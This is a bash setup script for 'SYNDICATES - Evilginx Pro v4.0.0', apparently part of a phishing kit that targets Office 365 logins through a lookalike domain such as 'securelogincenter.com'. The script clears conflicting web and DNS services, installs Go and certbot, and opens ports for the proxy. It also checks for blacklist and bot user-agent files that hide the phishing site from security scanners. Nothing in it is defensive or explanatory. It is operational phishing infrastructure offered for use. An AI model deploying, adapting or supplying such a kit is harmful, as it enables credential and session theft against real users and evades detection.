#!/bin/bash
# ═══════════════════════════════════════════════════════
# SYNDICATES - Evilginx Pro v4.0.0 Deployment Script
# Usage: ./o365.sh <domain>
# Example: ./o365.sh securelogincenter.com
# After this script, run: make
# ═══════════════════════════════════════════════════════

set -e

DOMAIN=$1

if [ -z "$DOMAIN" ]; then
    echo "Usage: ./o365.sh <domain>"
    echo ""
    echo "Example: ./o365.sh securelogincenter.com"
    exit 1
fi

echo "═══════════════════════════════════════════════════════"
echo " SYNDICATES - Evilginx Pro v4.0.0"
echo " Domain: $DOMAIN"
echo "═══════════════════════════════════════════════════════"
echo ""

# ── Step 1: Stop conflicting services ──
echo "[1/5] Stopping conflicting services..."
systemctl stop evilginx 2>/dev/null || true
systemctl reset-failed evilginx 2>/dev/null || true
screen -S evilginx -X quit 2>/dev/null || true
killall evilginx 2>/dev/null || true
sleep 2
fuser -k 443/tcp 2>/dev/null || true
fuser -k 80/tcp 2>/dev/null || true
fuser -k 53/tcp 2>/dev/null || true
fuser -k 53/udp 2>/dev/null || true
systemctl stop systemd-resolved 2>/dev/null || true
systemctl disable systemd-resolved 2>/dev/null || true
if [ -L /etc/resolv.conf ]; then
    rm -f /etc/resolv.conf
    echo 'nameserver 8.8.8.8' > /etc/resolv.conf
    echo 'nameserver 1.1.1.1' >> /etc/resolv.conf
fi
systemctl stop apache2 2>/dev/null || true
systemctl disable apache2 2>/dev/null || true
systemctl stop nginx 2>/dev/null || true
systemctl disable nginx 2>/dev/null || true
echo "  OK"

# ── Step 2: Install dependencies ──
echo "[2/5] Installing dependencies..."
apt-get update -y -qq
DEBIAN_FRONTEND=noninteractive apt-get upgrade -y -qq -o Dpkg::Options::='--force-confdef' -o Dpkg::Options::='--force-confold'
apt-get install -y -qq wget curl ca-certificates screen certbot make unzip
echo "  OK"

# ── Step 3: Install Go if not present ──
if ! command -v go &>/dev/null || ! go version 2>/dev/null | grep -q "go1"; then
    echo "[3/5] Installing Go..."
    wget -q https://go.dev/dl/go1.21.6.linux-amd64.tar.gz
    rm -rf /usr/local/go
    tar -C /usr/local -xzf go1.21.6.linux-amd64.tar.gz
    rm -f go1.21.6.linux-amd64.tar.gz
    export PATH=$PATH:/usr/local/go/bin
    echo 'export PATH=$PATH:/usr/local/go/bin' >> /etc/profile
    ln -sf /usr/local/go/bin/go /usr/bin/go
    echo "  Go $(go version | awk '{print $3}') installed"
else
    echo "[3/5] Go already installed: $(go version | awk '{print $3}')"
fi

# ── Step 4: Open firewall ──
echo "[4/5] Opening firewall ports..."
ufw allow 80/tcp 2>/dev/null || true
ufw allow 443/tcp 2>/dev/null || true
ufw allow 53/tcp 2>/dev/null || true
ufw allow 53/udp 2>/dev/null || true
ufw allow 8443/tcp 2>/dev/null || true
ufw allow 1337/tcp 2>/dev/null || true
iptables -I INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null || true
iptables -I INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null || true
iptables -I INPUT -p tcp --dport 8443 -j ACCEPT 2>/dev/null || true
iptables -I INPUT -p udp --dport 53 -j ACCEPT 2>/dev/null || true
echo "  OK"

# ── Step 5: Clean old config (preserve blacklists) ──
echo "[5/5] Cleaning old config..."
rm -f config/config.yaml config/data.db 2>/dev/null
rm -rf config/crt 2>/dev/null
mkdir -p config
echo "  OK"

# ── Verify blacklist files ──
echo ""
BL_COUNT=$(wc -l < config/blacklist.txt 2>/dev/null || echo 0)
BA_COUNT=$(wc -l < config/bot_agent.txt 2>/dev/null || echo 0)
BH_COUNT=$(wc -l < config/bot_host.txt 2>/dev/null || echo 0)
echo "  blacklist.txt:  $BL_COUNT entries"
echo "  bot_agent.txt:  $BA_COUNT entries"
echo "  bot_host.txt:   $BH_COUNT entries"
if [ "$BL_COUNT" -lt 10 ] || [ "$BA_COUNT" -lt 10 ]; then
    echo ""
    echo "  WARNING: blacklist files are empty or missing!"
    echo "  Make sure config/blacklist.txt and config/bot_agent.txt are included in the zip"
fi

echo ""
echo "═══════════════════════════════════════════════════════"
echo " READY — now run: make"
echo "═══════════════════════════════════════════════════════"
